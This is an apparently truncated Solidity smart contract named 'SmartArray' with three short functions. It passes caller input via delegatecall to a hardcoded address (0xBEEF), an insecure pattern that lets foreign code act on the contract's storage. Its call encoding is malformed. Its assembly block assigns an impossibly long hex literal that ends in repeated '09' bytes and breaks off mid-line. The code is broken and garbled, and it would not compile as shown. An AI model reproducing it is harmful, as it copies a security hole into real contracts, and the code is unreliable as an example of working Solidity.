pragma solidity ^0.8.0;
contract SmartArray {
    address arr;
    constructor() public {
        arr = address(uint160(0xBEEF));
    }
    function setLastAddress(uint256 v0x) public {
        arr.delegatecall(abi.encodePacked(keccak256('set(uint256,uint256)'), v0x));
    }
    function getLastAddress() public view returns (address) {
        uint256 s;
        assembly {
            s := 0xbfffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffa55ac718d7046ca7c35cb49aaef91c21894e657843ff81416d0c2b5a84777122ce7db8c19b70af0b461794c14a274e2ff612f5490a62fd598fd97b67550cb42ad33b526934eb99859890b9fa91c6ad32ce3146888520994c14ab836d6608ac67870d9b73f61caffc9a9cc3f38b21ec28cc09815ce3c77aa9a7d9d53a446cf5ce19932375c3d82f991a4bd5fb1c59a664e7835b7b412c8a88417f363f8875e8e9948021dd2a7540ae632b2699a55460c338ab016121c4df896bd515d2da6f516e29a485e50ab0ab09090909090909090909090909090909090909090909090909090909
